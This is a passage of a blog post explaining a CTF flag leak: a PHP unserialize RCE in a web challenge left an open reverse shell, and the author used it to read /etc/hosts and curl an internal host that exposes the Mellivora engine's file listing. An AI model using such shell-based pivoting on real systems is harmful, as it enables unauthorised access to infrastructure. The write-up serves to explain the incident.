    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><img src="/img/2020/02/image-20200223041326135-1.png" alt="image-20200223041326135"></p><p>First of all, I hope there is no misunderstanding, I didn’t abused the server.<br>During the toss of insomnia, I saw all the flags leaked of the ongoing CTF in CTFTime.<br>Using the reverse shell that was left open through the web challenge a few hours ago, I was able to identify all the causes 10 minutes after the server went down.</p><p>It’s not so technical, but I decided to write this down to show explanation for the dumbfounded participants.</p><h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>The web challenge <code>Brutus</code> has a vulnerability in <code>PHP unserialize</code>.<br>And It gives remote code execution RCE Privileges to user.</p><p><img src="/img/2020/02/image-20200223041726382.png" alt="img"></p><p>This vuln allows us to create a reverse shell, and It doesn’t have a time-out check.<br>Even after five hours from solved the problem, the connection was still there.<br>Thanks to that, analysis was very comfortable.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@5841bda2da57:/code$ <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">172.26.0.4      5841bda2da57</span><br></pre></td></tr></table></figure><p>By the <code>/etc/hosts</code> file allows you to check the internal IP address of the challenge server is <code>172.26.0.4</code>.<br>If not specifically managed, so I can expect the address of the host server is <code>172.26.0.1</code> or around that.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">www-data@5841bda2da57:/code$ curl 172.26.0.1</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Index of /<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Index of /<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/blank.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[ICO]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=N;O=D&quot;</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=M;O=A&quot;</span>&gt;</span>L</span><br><span class="line">ast modified<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=S;O=A&quot;</span>&gt;</span>Size<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=D;O=A&quot;</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/folder.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[DIR]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mellivora/&quot;</span>&gt;</span>mellivora/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span></span><br><span class="line">2020-02-21 22:08  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.29 (Ubuntu) Server at 172.26.0.1 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>It seems that a web server works on <code>172.26.0.1</code>.</p><p>Here you can see one folder, and you can see that it’s using the Melivora CTF engine through its name and internal files.</p><ul><li><a href="https://github.com/Nakiami/mellivora">https://github.com/Nakiami/mellivora</a></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">www-data@5841bda2da57:/code$ curl 172.26.0.1/mellivora/</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Index of /mellivora<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Index of /mellivora<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/blank.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[ICO]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=N;O=D&quot;</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=M;O=A&quot;</span>&gt;</span>Last modified<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=S;O=A&quot;</span>&gt;</span>Size<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=D;O=A&quot;</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/back.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[PARENTDIR]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Parent Directory<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/unknown.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[   ]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;Dockerfile&quot;</span>&gt;</span>Dockerfile<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>720 <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/unknown.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[   ]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;LICENSE&quot;</span>&gt;</span>LICENSE<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span> 34K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/text.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[TXT]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;README.md&quot;</span>&gt;</span>README.md<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2.8K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/text.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[TXT]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;benchmarks.md&quot;</span>&gt;</span>benchmarks.md<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>6.4K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/unknown.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[   ]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;codeception.yml&quot;</span>&gt;</span>codeception.yml<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>340 <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/unknown.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[   ]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;composer.json&quot;</span>&gt;</span>composer.json<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>696 <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/unknown.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[   ]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;composer.lock&quot;</span>&gt;</span>composer.lock<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>106K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/unknown.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[   ]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;docker-compose.dev.yml&quot;</span>&gt;</span>docker-compose.dev.yml<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-22 06:35  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>1.1K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/unknown.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[   ]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;docker-compose.test.yml&quot;</span>&gt;</span>docker-compose.test.yml<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>1.2K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/folder.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[DIR]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;htdocs/&quot;</span>&gt;</span>htdocs/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/folder.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[DIR]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;include/&quot;</span>&gt;</span>include/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-20 13:35  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/folder.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[DIR]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;install/&quot;</span>&gt;</span>install/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/text.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[TXT]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;rules.txt&quot;</span>&gt;</span>rules.txt<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-21 22:08  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>826 <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/folder.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[DIR]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span 